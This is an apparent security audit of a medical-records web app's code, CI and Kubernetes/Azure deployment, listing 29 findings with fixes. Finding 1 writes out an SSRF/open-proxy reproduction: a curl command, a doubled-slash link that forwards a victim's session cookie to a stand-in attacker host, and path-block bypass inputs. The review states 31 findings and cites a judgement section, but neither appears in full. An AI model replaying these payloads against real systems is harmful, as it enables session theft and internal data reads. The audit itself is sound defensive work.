# Flaws review: d3df88b to the working tree

The scope is everything from base commit `d3df88b` to the current working tree:
- merged PRs #42 to #50 (server-side rendering, coverage, mappers, Node in the image, kind, the Helm chart, hardening, Argo CD, the SignalR backplane)
- the uncommitted `feature/azure` work: `deploy/azure`, `deploy/argocd/medapp-azure.yaml`, `deploy/versions.sh`, `.github/scripts/deploy-to-env.sh` and the workflow changes

Reviewed 15 November 2026.

## How this was checked

- **Read:** the whole diff, the chart, the scripts, the Bicep, and each PR's description and test plan.
- **Ran:**
  - `dotnet test MedApp.UnitTests -c Release`: 708 passed.
  - In `MedApp.Web`, `npm run typecheck` and `npx vitest run`: 666 passed.
  - `helm lint --strict` with every values file: all passed.
  - `helm template` of Traefik, External Secrets and Argo CD with the bootstrap inputs.
  - `bicep build`, `bicep lint` and `bicep build-params`: all passed.
- **Reproduced locally:**
  - **Against the API:** the Release build of the API (`MedApp.API/bin/Release/net10.0`) in Production mode on 127.0.0.1, with a scratch web root and stand-in Node renderers. All files were in the session scratchpad.
  - **In git:** the environment-branch rollback, in a throwaway repository.
  - **On kind:** read-only GETs and `kubectl get` and `logs` against the running cluster.
- **Not done:** nothing was run against Azure, and nothing in the repo was changed except this file.

**Totals: 4 high, 14 medium and 13 low (31 findings).** None is rated critical, but finding 1 is critical wherever the API can be reached without a proxy that merges `//` in paths.

Each finding says whether it was **confirmed** (reproduced, or verified with a tool or API) or **suspected** (from reading the code or documentation).

---

## Findings, most severe first

### 1. Page forwarding is an open proxy: `//host/…` makes the API fetch any host, with the caller's cookies, and serve the reply from MedApp's origin

- **Severity:** high, and critical where Kestrel sees raw paths. **Confidence:** high. **Status:** confirmed by reproduction.
- **Evidence:**
  - **The URL:** `MedApp.API/ServerRendering/SsrPages.cs:50-52` builds the target with `new Uri(address, context.Request.Path + context.Request.QueryString)`. A path that starts with `//` is a network-path reference, so `new Uri("http://127.0.0.1:port/", "//evil.example/x")` resolves to `http://evil.example/x`.
  - **The request:** lines 53-57 copy `Cookie`, `Accept`, `Accept-Language` and `User-Agent` onto that request.
  - **The reply:** lines 66-73 copy the status, headers and body back to the caller.
  - **The route:** the fallback route `{*path:nonfile}` (`ApplicationBuilderExtensions.cs:54`) matches such paths.
- **Reproduction:** the Release API ran with a stand-in renderer and a second local HTTP service on 127.0.0.1:5995. This request returned that service's body (`INTERNAL-ONLY RESPONSE`, 200):

  ```
  curl --path-as-is -H "Cookie: medapp_session=attacker-own" \
    "http://127.0.0.1:5992//127.0.0.1:5995/internal-secret?x=1"
  ```

  The service logged `GET /internal-secret?x=1 cookie=medapp_session=attacker-own`, and the renderer never saw the request. Only a literal leading `//` works: the `PathString + QueryString` operator percent-encodes the backslash and `%5C` forms.
- **Why kind and Azure aren't exploitable today:** Traefik v3.7 cleans request paths by default and merges `//`. Through kind's ingress, `//127.0.0.1:8081/health`, `/.//…`, `/x/..//…` and `///…` all came back as the app's 404 page. That protection comes from the proxy's defaults, not from the app.
- **Failure scenario:** this applies anywhere Kestrel sees the raw path:
  - `docker run -p 8080:8080` of the image
  - the AppHost's publish target (`PublishAsDockerFile`), such as Azure Container Apps, whose Envoy ingress doesn't merge slashes by default
  - ingress-nginx
  - any pod in the `traefik` namespace, which the network policy allows to call the API

  The attack:
  1. An attacker sends a signed-in member of staff the link `https://medapp.example//attacker.example/x`.
  2. Their browser sends the `medapp_session` cookie to MedApp, and the API forwards it to attacker.example. That's enough to hijack the session.
  3. The attacker's response, HTML and script included, is then served from MedApp's origin, where it can call `/api` as the victim.

  Without a victim, it's a full-read SSRF to anything the pod can reach: the health port and the Node renderer inside the pod, and the whole cluster network where network policies aren't enforced.
- **Fix:**
  - **Build the URL from its parts:**

    ```csharp
    var target = new UriBuilder(address)
    {
        Path = context.Request.Path.Value,
        Query = context.Request.QueryString.Value,
    }.Uri;
    ```

  - **Check where it points:** refuse to forward, and fall back to `index.html`, unless `target.Authority == address.Authority`. Also reject paths starting with `//` up front.
  - **Test it:** add tests with a path such as `//evil.test/x` that assert the request stays on the renderer and no cookie leaves.

### 2. The documented rollback (`git revert -m 1` on an env branch) silently loses the reverted changes at the next deploy

- **Severity:** high. **Confidence:** high. **Status:** confirmed by reproduction.
- **Evidence:**
  - **The rollback as documented:** `deploy/argocd/README.md:19` says "revert a deploy commit there with `git revert -m 1 <commit>`. That rolls back both the chart and the image together", and `deploy/argocd/medapp-kind.yaml:7` says the same.
  - **The deploy:** `.github/scripts/deploy-to-env.sh:18-22` deploys by merging `main@sha` into the env branch.
- **Reproduction:** a throwaway repository, following the same steps as `deploy-to-env.sh`:
  1. Main has A, then B, which tightens `networkpolicy.yaml`. Deploy B.
  2. Run `git revert -m 1` on the deploy commit (the README's rollback).
  3. Main gets C, which changes only `api.yaml`. Deploy C.

  The merge is clean, and the env branch ends up with C's `api.yaml` and C's image but A's `networkpolicy.yaml`, while main has B's. Git treats B as already merged, so the revert stays.

  When C touches lines next to B's change, the merge conflicts instead and the script stops. Its comment at line 20 says only "a hand edit to the branch" could cause a conflict, but the documented rollback is exactly that hand edit.
- **Failure scenario:** production (env/azure) is rolled back after a bad deploy, then the fix ships. Argo CD deploys the new image with some of the old chart: a missing environment variable, a dropped hardening change, a missing network policy rule. Nothing reports the drift.
- **The database:** a rollback never rolls back the database. The old image's migrations bundle runs as the Sync hook and leaves the newer schema in place. That's fine under the chart README's expand-then-contract rule, but the rollback docs should say so.
- **Fix:**
  - **Replace, don't merge:** make each deploy commit's tree exactly `main@sha`'s tree plus the image file, for example `git read-tree $sha`, write the image file, then `git commit-tree -p <env head>`. A rollback is then just "deploy an older SHA", through a `workflow_dispatch` input.
  - **Or, if merges stay:**
    - Document "revert the revert before the next deploy".
    - Add a check that the env branch's tree matches main's apart from the image file.

### 3. The SSR `HttpClient` gets Aspire's standard resilience handler: a failed render is retried four times, and when the circuit breaker opens, every page is an unhandled 500

- **Severity:** high. **Confidence:** high. **Status:** confirmed by reproduction.
- **Evidence:**
  - **The handler:** `MedApp.ServiceDefaults/Extensions.cs:29-36` adds `AddStandardResilienceHandler()` to every `HttpClient`. That includes the named `ssr` client (`MedApp.API/Common/Extensions/ServiceExtensions.cs:29-30`). The handler:
    - retries 5xx responses and timeouts three times, with backoff
    - times each attempt out at 10 s
    - has a circuit breaker
  - **The fallback:** `SsrPages.cs:39` falls back to `index.html` only for `HttpRequestException` and `TaskCanceledException`. Polly's `BrokenCircuitException` and `TimeoutRejectedException` aren't caught.
  - **Render errors:** a 5xx from Node is passed straight through as the page (`SsrPages.cs:66-73`).
- **Reproduction:** the Release API with a stand-in renderer.
  - **Renderer answering 500:** one page view made 4 render requests, took 7.5 s, and returned the renderer's bare `The page could not be rendered.` 500. The browser never got the client-rendered fallback.
  - **Renderer hanging:** 15.1 s, then `index.html`. The 10 s attempt timeout fired first (`Polly.Timeout.TimeoutRejectedException … '00:00:10'`) and was retried before `RenderTimeout` won.
  - **Circuit breaker:** after 60 concurrent views of a failing page, the renderer was made healthy. Requests for a different page returned 500 nine times in a row (about 3.5 s) without reaching the renderer. The log shows `BrokenCircuitException` and "An unhandled exception was thrown by the application".
- **Failure scenario:** one route fails to render, through a bug, or the API failing `whoami` during a database blip.
  - Each view costs 4 renders, each making 3 or 4 API calls.
  - Each view takes 7.5 s and ends in a plain-text 500.
  - Under load, the breaker opens and every page on the site is a 500 for 5 s at a time.
  - During an outage, the retries multiply load on the struggling API.

  PR #42's "if Node is … too slow, it serves index.html" and `SsrOptions.RenderTimeout`'s comment don't describe what happens.
- **Fix:**
  - **Drop the handler:** call `services.AddHttpClient(SsrPages.ClientName).RemoveAllResilienceHandlers()`, or configure it explicitly with no retries and no breaker.
  - **Widen the fallback:** serve `index.html` for any exception before the response has started, and for any 5xx from the renderer.
  - **Test the real pipeline:** use a real `IHttpClientFactory` from a `ServiceCollection` with the same defaults, not a mocked one (see finding 18).

### 4. Azure: `bootstrap.sh` fails at its first step, because `deploy/azure/traefik-values.yaml` doesn't match the Traefik chart's schema

- **Severity:** high: it blocks the Azure setup. **Confidence:** high. **Status:** confirmed.
- **Evidence:**
  - **The values:** `deploy/azure/traefik-values.yaml:6-12` sets `ports.web.redirections.entryPoint`. Traefik chart 42.3.2 (`deploy/versions.sh:3`) expects `ports.web.http.redirections.entryPoint`.
  - **The error:** `helm template traefik traefik/traefik --version 42.3.2 --values deploy/azure/traefik-values.yaml` fails with "values don't meet the specifications of the schema(s) … at '/ports/web': additional properties 'redirections' not allowed".
  - **Where it runs:** `bootstrap.sh:40-41` runs that install under `set -e`.
- **The comment:** line 2 says Let's Encrypt's challenges are exempt from the redirect, but nothing exempts them (`allowACMEByPass` defaults to false). The HTTP-01 challenge will probably still pass: Let's Encrypt follows redirects to https, and `websecure` applies TLS to every router. Still, the comment is wrong.
- **Why CI missed it:** the `helm` job lints only MedApp's chart. It never renders the cluster services with their values.
- **Fix:**
  - Move the block under `ports.web.http.redirections.entryPoint`.
  - Consider setting `allowACMEByPass: true` on the web entry point.
  - Add a CI step that runs `helm template` for Traefik, cert-manager, External Secrets and Argo CD with each environment's values, at the versions in `deploy/versions.sh`.

### 5. Changing any of the three Azure passwords causes an outage, but the README says the cluster catches up on its own

- **Severity:** medium. **Confidence:** high; this is standard Kubernetes behaviour (not run).
- **Evidence:**
  - **Who owns the passwords:** `main.bicep:228-233` and `338-371` make Bicep the owner of the SQL login's password and of all three Key Vault secrets. Every run sets them from parameters (`deploy.sh:7-10`).
  - **The claim:** `deploy/azure/README.md:88` says "External Secrets brings any change into the cluster within an hour".
  - **What really happens:** the API and Valkey read the passwords as environment variables from Secrets (`api.yaml:53-65`, `valkey.yaml:46-52`). Running pods never re-read those, and there's no checksum annotation or reloader to restart them.
- **Failure scenario:** someone runs `deploy.sh` from a new machine with fresh passwords, or rotates one on purpose.
  - **The database:** Azure SQL's login changes at once. External Secrets updates the Secret within the hour, but the API pods keep the old connection string. New connections fail, the pool drains, and the site is down until someone restarts the pods.
  - **The backplane:** restarted API pods get the new password while the running Valkey still has the old one, so live notifications silently stop crossing between pods.
  - **The first admin:** its Key Vault secret is overwritten too, so the "first admin password" in Key Vault no longer matches the account.
- **Fix:**
  - **Stop Bicep owning the values:** create the secrets only if they're missing (a deployment script, or seeding once and then using `existing`), or generate them in Key Vault.
  - **Restart pods on change:** add a reloader annotation (for example `reloader.stakater.com/auto`), or a checksum annotation driven by the secret version, so the API and Valkey roll when a Secret changes.
  - **Correct the README:** a rotation needs the API and Valkey to roll.

### 6. The first admin can't change their own password

- **Severity:** medium. **Confidence:** high; from the code (not run).
- **Evidence:**
  - **The admin's roles:** `FirstAdminSetup.cs:75` gives the new admin only the `Admin` role.
  - **The endpoint:** `AuthController.cs:144-145` puts the self-service password change behind `[Authorize(Roles = "User", Policy = "SelfUserOnly")]`. An Admin-only account gets a 403 from `PUT /api/auth/users/{username}/update-password`, which the React Change password page calls (`MedApp.Web/src/api/users.ts:95`).
  - **Why it never showed up:** the dev tools' admin has both roles (`tools/MedApp.DevMcp/Tools/TestAdminTools.cs:19`). PR #48 only checked that the first admin can use admin-only endpoints.
- **Failure scenario:** on every new kind or Azure database, the first admin signs in with the generated password and can't change it. Its password stays the same as:
  - the `medapp-first-admin` Secret, which is kept forever (`helm.sh/resource-policy: keep`) and readable by anyone who can read Secrets in `medapp`
  - the Key Vault secret
- **Fix:**
  - Either give the first admin both roles (`FirstAdminSetup.Roles` already lists them both), or allow the self-service change for all staff (`AuthPolicies.Staff` with `SelfUserOnly`).
  - Add a test that the admin it creates can change its own password.

### 7. Nothing requires CI to pass before a merge, yet every merge deploys

- **Severity:** medium. **Confidence:** high. **Status:** confirmed through the GitHub API.
- **Evidence:**
  - **The ruleset:** the `Protect` ruleset on `main` has `deletion`, `non_fast_forward` and `pull_request` (0 approvals) rules. It has no `required_status_checks` rule (`gh api repos/Aliator/MedApp/rules/branches/main`).
  - **The deploy:** every push to main is deployed to env/kind, and to env/azure once its variables are set (`publish.yml:8-14`).
  - **The claim:** `deploy/argocd/README.md:7` says a pull request merges "after CI (`main.yml`) has passed on it".
- **Failure scenario:** a PR with failing tests, a broken chart or a broken Bicep build is merged by accident, and Publish builds and deploys it to production.
- **Fix:**
  - Add the `web`, `helm` and `unit-tests` jobs as required status checks.
  - Consider making env/azure a manual promotion (see the judgement section).

### 8. Write access to an environment branch is production deploy access, and those branches are unprotected

- **Severity:** medium. **Confidence:** high. The ruleset is confirmed; the rest is read from the manifests.
- **Evidence:**
  - **No protection:** `env/kind` has no rules (`gh api …/rules/branches/env%2Fkind` returns `[]`, `protected=false`), and env/azure will be the same.
  - **Argo CD applies whatever lands:** the Applications use `project: default` with automated sync, prune and self-heal (`medapp-azure.yaml:13,27-30`). Argo CD's cluster-wide service account applies whatever is on env/azure, and the default project allows any kind of resource, cluster-scoped ones included.
  - **Any branch can be deployed:** `publish.yml:14` allows `workflow_dispatch` from any branch, and `deploy-to-env.sh:13,21` merges `GITHUB_SHA`, the dispatched branch, into the env branch.
- **Failure scenario:**
  - **Kind:** running Publish by hand on `feature/x` builds it, deploys it to kind, and merges its commits into env/kind. They stay there even if the feature is dropped, because later deploys merge main on top.
  - **Azure:** the identity's subject (`main.bicep:412`) stops the Azure sign-in from other branches, which is good. But anyone, or any workflow, with `contents: write` can still push to env/azure directly.
- **Fix:**
  - Protect `env/*`, letting only the deploy workflow through, for example with a GitHub App or deploy key as the ruleset's bypass.
  - Guard the deploy steps with `if: github.ref == 'refs/heads/main'`.
  - Give Argo CD an AppProject limited to the `medapp` namespace and namespaced kinds.

### 9. Azure SQL serverless will fail requests after every idle hour, and the app has no retry policy

- **Severity:** medium. **Confidence:** medium-high, from documented Azure behaviour (not run).
- **Evidence:**
  - **Auto-pause:** `main.bicep:40-41,260` pauses the database after 60 idle minutes.
  - **No retries:** `MedApp.Infrastructure/Common/Extensions/ServiceExtensions.cs:37-39` calls `UseSqlServer` with no `EnableRetryOnFailure`.
  - **Every request hits the database:** session validation runs on every request, the Node renderer's included.
- **Failure scenario:** the first users each morning, and after any long break, get errors for up to a minute while the database resumes (error 40613). Azure SQL's routine reconfigurations cause occasional 500s too. With finding 3, each failing page view is retried four times.
- **Fix:**
  - Turn on `EnableRetryOnFailure`, and wrap the explicit transactions in `IdentityTransactions` in `CreateExecutionStrategy().ExecuteAsync(...)`. Otherwise the retrying strategy refuses transactions the app starts itself.
  - Or set `sqlAutoPauseDelay` to -1 in production and accept the cost.

### 10. The Node renderer inherits the database and backplane connection strings

- **Severity:** medium. **Confidence:** high. **Status:** confirmed by reproduction.
- **Evidence:**
  - **The code:** `SsrServer.cs:74-90` adds variables to `ProcessStartInfo.Environment`, which starts out as a copy of the API's whole environment.
  - **The reproduction:** a stand-in `server.mjs`, started by the Release API, reported `ConnectionStrings__DefaultConnection` and `ConnectionStrings__SignalRBackplane` in its `process.env`.
- **Failure scenario:** the Node process renders pages for any request path from the internet, with user content in them. A code-execution or environment-disclosure bug in it, or in a bundled dependency, gives away the database credentials. On Azure those are the SQL server admin's (finding 15).
- **Fix:** call `start.Environment.Clear()`, then add back only what Node needs: `PATH`, plus the five variables it reads.

### 11. The new scripts will probably be committed without the executable bit, and Publish runs them directly

- **Severity:** medium. **Confidence:** medium. **Status:** suspected; the work isn't committed yet.
- **Evidence:**
  - **Git's setting:** `git config core.filemode` is `false` here, so Git records new files as `100644`.
  - **Direct calls:** `publish.yml:53,86` runs `.github/scripts/deploy-to-env.sh …` directly, and the READMEs do the same with `deploy/azure/deploy.sh` and `bootstrap.sh`.
  - **It has happened before:** the kind scripts needed a fix for exactly this (0930eed, "Kept LF line endings and the executable bit on the kind scripts").
- **Failure scenario:** the first Publish run after the merge fails at "Deploy to kind (env/kind)" with `Permission denied` (exit 126).
- **Fix:** commit with `git add --chmod=+x .github/scripts/deploy-to-env.sh deploy/azure/*.sh`, or call the scripts with `bash …`.

### 12. Server rendering degrades silently and for good: Node is never restarted, and nothing reports it

- **Severity:** medium. **Confidence:** high, except the stream-error path (medium).
- **Evidence:**
  - **No restart:** `SsrServer.cs:116-129` logs once when Node exits, then stops. `SsrServerProcessTests.cs:123` (`ExecuteAsync_ServerExits_StaysOff`) asserts exactly that.
  - **Nothing notices:** the probes (`api.yaml:88-103`) and `/health` don't look at it.
  - **A stream error kills Node:** in `server.mjs:164`, `Readable.fromWeb(response.body).pipe(res)` has no error handling. A stream error becomes an unhandled 'error' event, which ends the process.
  - **Disconnects don't stop renders:** the abort on disconnect at `server.mjs:146` never fires for a GET, because `req.complete` is already true. Abandoned renders run to the end.
- **Failure scenario:** Node crashes once: out of memory under the shared 1 GiB limit, a stream error, or a bug. That pod serves client-rendered pages until it next restarts, which may be weeks away. With two copies, users get different behaviour depending on which pod answers.
- **Fix:**
  - **In the API:** restart Node with backoff in `ExecuteAsync`, and report SSR through a health check as degraded rather than unhealthy.
  - **In `server.mjs`:** use `stream.pipeline` with an error callback, and abort on `res.on('close')` when `!res.writableFinished`.
  - **Or:** run Node as a sidecar container (see the judgement section).

### 13. CI doesn't build what Publish ships

- **Severity:** medium. **Confidence:** high.
- **Evidence:** these are only ever built inside the Dockerfile, after the merge:
  - **The image:** `main.yml` has no Docker build.
  - **The SSR bundle:** the `web` job runs `npx vite build` (`main.yml:46-47`), not `npm run build`. So the server bundle (`vite build --ssr`, with `ssr.noExternal: true`) and the copy of `server.mjs` never run in CI.
  - **The migrations bundle** (`Dockerfile:43-46`).
  - **The cluster services' values** (finding 4).
  - **Node versions:** CI uses Node 24 (`main.yml:21`), the image builds and runs on Node 22 (`Dockerfile:12`), and local development here is Node 26.
- **Failure scenario:** a dependency that won't bundle for SSR, a migration that won't bundle, or a Dockerfile mistake merges green and then fails Publish. env/kind and env/azure stop moving, and nobody is told.
- **Fix:**
  - Add a PR job that runs `docker build -f MedApp.API/Dockerfile .`, with the GitHub Actions cache and no push.
  - Use one Node version everywhere, from an `.nvmrc` or a shared `NODE_VERSION`.

### 14. Supply chain: floating image tags, and actions pinned by tag in workflows that deploy to production

- **Severity:** medium. **Confidence:** high.
- **Evidence:**
  - **Images by floating tag:**
    - `Dockerfile:12-16,24,49`: `node:22-bookworm-slim`, `dotnet/sdk:10.0` and `dotnet/aspnet:10.0`
    - `values.yaml:61`: `valkey/valkey:8.1-alpine`
    - `values.yaml:126`: `mssql/server:2022-latest`
  - **Actions by tag:** `publish.yml:28,32,34,41,67,71,73` use `actions/checkout@v4`, `docker/setup-buildx-action@v3`, `docker/login-action@v3`, `docker/build-push-action@v6` and `azure/login@v2`. Those jobs have `contents: write`, `packages: write` and `id-token: write`. ReportGenerator in `main.yml:112` is already pinned by SHA, so the practice exists.
  - **Copy by tag:** the copy to Azure Container Registry is by tag, not digest (`publish.yml:83`), although its comment says "the same digest runs everywhere".
- **Failure scenario:**
  - **A moved action tag** runs an attacker's code with the token that pushes images and environment branches, which Argo CD then deploys.
  - **A new SQL Server image:** a new `2022-latest` cumulative update pulled onto a new node upgrades the database files, one way.
  - **A rebuilt image:** re-running the image job pushes a different build under the same commit tag. Nodes that already cached the old one keep running it (`IfNotPresent`).
- **Fix:**
  - Pin actions by SHA, and let Dependabot keep them current.
  - Pin images by digest.
  - Pass `steps.<build>.outputs.digest` to the copy, and write `image@sha256:…` into the environment's values file.

### 15. Azure: the app and its migrations sign in as the SQL server admin, and any namespace can read the Key Vault store

- **Severity:** medium. **Confidence:** high. `deploy/azure/README.md:102-103` admits this, but it deserves its ranking.
- **Evidence:**
  - **The admin login everywhere:** `main.bicep:43-44,232-233,344` puts the server admin login (`medapp`) into the connection string. The API, the migrations Job and the Node renderer (finding 10) all hold it.
  - **An open store:** the `azure-key-vault` ClusterSecretStore (`deploy/azure/cluster.yaml:22-33`) has no `conditions`, so an ExternalSecret in any namespace can read every secret in the vault.
- **Failure scenario:** anything that can read an API pod's environment, or create an ExternalSecret anywhere, gets full control of the Azure SQL server: every database, every login, and the power to drop them.
- **Fix:**
  - **Before the first real deploy:** create a contained database user for the app with only data rights, and a separate one for migrations.
  - **Close the store:** restrict the ClusterSecretStore with `conditions: [{namespaces: [medapp]}]`.
  - **Then:** move to workload identity, as the README plans.

### 16. Azure: following the teardown instructions destroys the database and its backups, and nothing guards against it

- **Severity:** medium. **Confidence:** medium-high, from the Azure SQL backup documentation.
- **Evidence:**
  - **The instruction:** `deploy/azure/README.md:98` says "Delete everything with `az group delete`".
  - **What goes with it:** the SQL server, the database and its backups all live in that resource group.
  - **No guard:** there's no resource lock in `main.bicep`, and backups are locally redundant (`main.bicep:263`).
- **Failure scenario:** someone follows the cost advice on the production resource group. Deleting the logical server deletes its point-in-time backups too (apart from a short, preview-only window to restore a dropped server), so the patients' records can't be restored.
- **Fix:**
  - Add a `CanNotDelete` lock on the SQL server and the Key Vault in the Bicep.
  - Say in the README what's lost.
  - For a medical records system, consider geo-redundant or long-term backups.

### 17. Azure scripts on Windows: `az … --output tsv` values may end in a carriage return

- **Severity:** medium. **Confidence:** medium. **Status:** suspected; the Azure CLI isn't installed on this machine.
- **Evidence:**
  - **Where:** `bootstrap.sh:22-25` and `deploy.sh:36` capture `az deployment group show … --output tsv`.
  - **The known bug:** the Azure CLI on Windows ends TSV rows with CRLF ([Azure/azure-cli#24140](https://github.com/Azure/azure-cli/issues/24140), with a fix proposed in a later PR). Git Bash's `$(…)` strips the `\n` but keeps the `\r`.
  - **Why it matters here:** the README's Windows setup (`deploy/azure/README.md:40`) makes this the author's own path.
- **Failure scenario:** `aks` becomes `aks-medapp-prod\r`, and `az aks get-credentials` fails. Had it got further, the client ID annotation on External Secrets' service account would carry the `\r`, and workload identity would fail.
- **Fix:** in both scripts, use `outputs() { az … --output tsv | tr -d '\r'; }`.

### 18. Test quality: the SSR tests miss the code paths that misbehave

- **Severity:** medium. **Confidence:** high.
- **Evidence:**
  - **The real pipeline is never used:** `SsrPagesTests.cs:68-73` gives `SsrPages` a mocked factory that returns a bare `HttpClient`, so the real pipeline (finding 3) never runs.
  - **The timeout isn't tested:** `Handle_RendererTooSlow_SendsTheClientRenderedApp` (`:153-161`) throws `TaskCanceledException` at once. Its 1 ms `RenderTimeout` plays no part.
  - **Untested paths:** nothing tests:
    - a 5xx from the renderer
    - a `//` path (finding 1)
    - the `/ssr` and `/.vite` block (finding 19)
  - **Security wiring isn't counted:** that block, HSTS and the https-redirect wiring live in `ApplicationBuilderExtensions`, which the coverage filter excludes as wiring (`main.yml:121-122`). PR #43's "100% of counted lines" leaves these security controls out.
  - **The health port:** its mapping in `MedApp.ServiceDefaults` has no tests, because that assembly is excluded.
  - **First admin:** the tests replace `IIdentityTransactions` with something that just runs the delegate (`FirstAdminSetupTests.cs:33-34`). So "makes no account when a role can't be made" checks the flow of control, not the rollback. The role check only looks for `Admin` (finding 6).
- **Fix:**
  - Test `SsrPages` through a real `ServiceCollection` with the same defaults, and a test server as the renderer.
  - Add `WebApplicationFactory` tests for the pipeline: blocked paths, `//`, the health port and HSTS.
  - Count `ApplicationBuilderExtensions` in coverage.

### 19. The block meant to keep `/ssr` and `/.vite` from ever being served is bypassed with a doubled slash

- **Severity:** low. **Confidence:** high. **Status:** confirmed.
- **Evidence:** `ApplicationBuilderExtensions.cs:26-35` checks `StartsWithSegments("/ssr")`, but `PhysicalFileProvider` trims leading slashes, so `//ssr/server.mjs` gets through. Against the Release API:

  | Path | Result |
  |---|---|
  | `/ssr/server.mjs` | 404 |
  | `//ssr/server.mjs` | 200 (`text/javascript`) |
  | `//ssr/entry-server.js` | 200 |
  | `//.vite/manifest.json` | 200 |

  Through kind's Traefik, the `//` is merged and all four are 404.
- **Impact:** low, because the files are built from the public repo. But PR #42's claim is false, and the same `//` handling is behind finding 1.
- **Fix:** publish the SSR bundle outside `wwwroot` (for example `/app/ssr`, with `SsrOptions.ScriptPath` pointing there), so there's nothing to block.

### 20. Bicep naming: an 8-character environment name makes the Key Vault name invalid

- **Severity:** low. **Confidence:** high.
- **Evidence:**
  - **Too long:** `main.bicep:12-14` allows up to 8 characters, but `:64` builds `kv-medapp-<env>-<6>`, which is 17 characters plus the name. An 8-character name gives 25, over Key Vault's limit of 24.
  - **Other names:** a hyphen or capital letter breaks the registry name (`:62`, letters and digits only) and the SQL server name (`:63`, lower case).
  - **Name reuse:** soft delete with purge protection reserves the vault name for 90 days. The suffix comes from the resource group's ID, so redeploying into a re-created group of the same name fails until then. The README mentions the name but not that `deploy.sh` will fail.
- **Fix:** use `@maxLength(7)` and lower-case the name, or shorten names with `take(...)`. Note the 90-day collision in the README.

### 21. Readiness only means "the process is up", and the health port serves the whole app

- **Severity:** low. **Confidence:** high.
- **Evidence:**
  - **Readiness:** the only health check is `self` (`MedApp.ServiceDefaults/Extensions.cs:100-107`), so `/health` (readiness) is the same as `/alive`.
  - **The health port:** Kestrel listens on 8081 for everything (`api.yaml:67-70`; the kind logs show "Now listening on: http://[::]:8081"). Only `/health` and `/alive` are tied to that port; every other path runs the full app on it.
- **Impact:**
  - Pods stay ready while the database or backplane is down, or SSR is off.
  - The health port is protected only by the network policy.
- **Fix:**
  - Keep readiness cheap: a database check would hold up the first-install hook order under `--wait`.
  - Add a "degraded" check for SSR.
  - On 8081, answer anything but `/health` and `/alive` with a 404.

### 22. Azure availability: "two copies across the nodes" isn't enforced, and the edge is a single pod

- **Severity:** low. **Confidence:** high.
- **Evidence:**
  - **The API:** `deploy/azure/values.yaml:4` says the two API copies run "across the nodes", but `api.yaml` has no topology spread or anti-affinity.
  - **Traefik:** runs the chart default of one replica, with no PDB.
  - **Valkey:** one replica, with no PDB (`valkey.yaml:28`).
  - **Upgrades:** AKS auto-upgrades patches and node images with no maintenance window (`main.bicep:186-189`).
- **Impact:**
  - Losing one node can take both API copies.
  - Every node image upgrade restarts the only Traefik pod, a short outage at an unplanned time.
- **Fix:**
  - Add `topologySpreadConstraints` on `kubernetes.io/hostname`.
  - Run two Traefik replicas with a PDB.
  - Add a maintenance configuration.

### 23. .NET and Node share one 1 GiB memory limit, with no heap caps

- **Severity:** low. **Confidence:** medium. **Status:** suspected.
- **Evidence:** `values.yaml:16-21`. .NET sizes its heap from the container limit (75% by default), and Node sizes its own separately.
- **Impact:** under load the container can be killed for running out of memory. If the kernel picks Node, SSR is off for good (finding 12).
- **Fix:** set `DOTNET_GCHeapHardLimitPercent` and Node's `--max-old-space-size` so they add up to less than the limit, or move Node to a sidecar.

### 24. Server-rendered pages now carry patient data in the HTML, with no `Cache-Control` or security headers

- **Severity:** low. **Confidence:** high.
- **Evidence:**
  - **The headers:** a page response on kind has only `Content-Type`. There's no `Cache-Control`, CSP, `X-Content-Type-Options`, `frame-ancestors` or `X-Frame-Options`, or `Referrer-Policy`. Those headers were missing before SSR too.
  - **What changed:** before SSR, the HTML (`index.html`) held no patient data. Now each page carries the dehydrated query cache.
  - **Escaping is fine:** a hostile synthetic name rendered fully escaped.
- **Impact:**
  - The back-forward cache and any cache along the way can keep patient data after sign-out.
  - Framing is unrestricted.
- **Fix:** send `Cache-Control: no-store, private` on rendered pages, and add a baseline set of security headers.

### 25. Live notifications give up after about 42 seconds

- **Severity:** low. **Confidence:** high.
- **Evidence:**
  - **Reconnects:** `LiveNotifications.tsx:33` uses the default `withAutomaticReconnect()` schedule (0, 2, 10 and 30 s), with no restart on `onclose`.
  - **First start:** a failed first `start()` isn't retried either (`:45`).
- **Impact:** after an API outage longer than about 42 s, open tabs get no live notifications until a full reload. Examples: a bad rollout, or both copies on a drained node. With rollouts and node upgrades, this is now more likely.
- **Fix:** use a custom retry policy that keeps trying with a capped delay, or restart on `onclose`.

### 26. Forwarded headers are trusted from anyone

- **Severity:** low. **Confidence:** high.
- **Evidence:**
  - **The setting:** `api.yaml:72-73` sets `ASPNETCORE_FORWARDEDHEADERS_ENABLED=true`, which clears `KnownProxies` and `KnownNetworks`.
  - **Why it's safe today:** the network policy limits callers to the Traefik namespace, and Traefik strips untrusted `X-Forwarded-*` headers.
  - **Client IPs on Azure:** Traefik's Service uses `externalTrafficPolicy: Cluster` (the chart default), so `UserSessions.CreatedByIp` will record node IPs, not clients.
- **Fix:**
  - Set `ForwardedHeadersOptions.KnownNetworks` to Traefik's addresses.
  - Use `externalTrafficPolicy: Local` on Azure if client IPs matter.

### 27. Secrets in process arguments and in Helm's release history

- **Severity:** low. **Confidence:** high.
- **Evidence:**
  - **Process arguments:** these are visible in `/proc/*/cmdline`, and in `ps` on the node:
    - the migrations Job's connection string, passed as `--connection` (`migrations-job.yaml:42`)
    - Valkey's password, passed as `--requirepass $(VALKEY_PASSWORD)` (`valkey.yaml:46`)
  - **Helm history:** with plain Helm, the chart's generated Secrets are stored in every `sh.helm.release.v1.*` revision.
- **Fix:**
  - Let the migrations bundle read the connection string from configuration.
  - Give Valkey its password through a config file from the Secret.
  - Outside local use, prefer External Secrets or `existingSecret` to Secrets the chart generates.

### 28. `create-first-admin` exits without disposing the host

- **Severity:** low. **Confidence:** low to medium. **Status:** suspected.
- **Evidence:** `Program.cs:18-19` returns from `Main` without disposing `app`. The console logger writes on a background thread and only flushes when it's disposed.
- **Impact:** the Job's last log line ("No first admin made: …") can be lost, and that's exactly the line you need when it fails.
- **Fix:** use `await using var app = builder.Build();`, or `await app.DisposeAsync()` before returning.

### 29. Publish ordering: the comment says "in order", but GitHub cancels waiting runs

- **Severity:** low. **Confidence:** high.
- **Evidence:** `publish.yml:18-21`. With `cancel-in-progress: false`, GitHub keeps only the newest waiting run in a group, and cancels older waiting ones.
- **Impact:**
  - When merges come in quick succession, the commits in between never get an image, so you can't roll back to them.
  - Re-running an older run by hand rewrites the tag, so it deploys an older image with the newer chart.
- **Fix:**
  - Correct the comment.
  - Refuse to deploy a commit the environment branch already contains (`git merge-base --is-ancestor`), unless it's an explicit rollback.

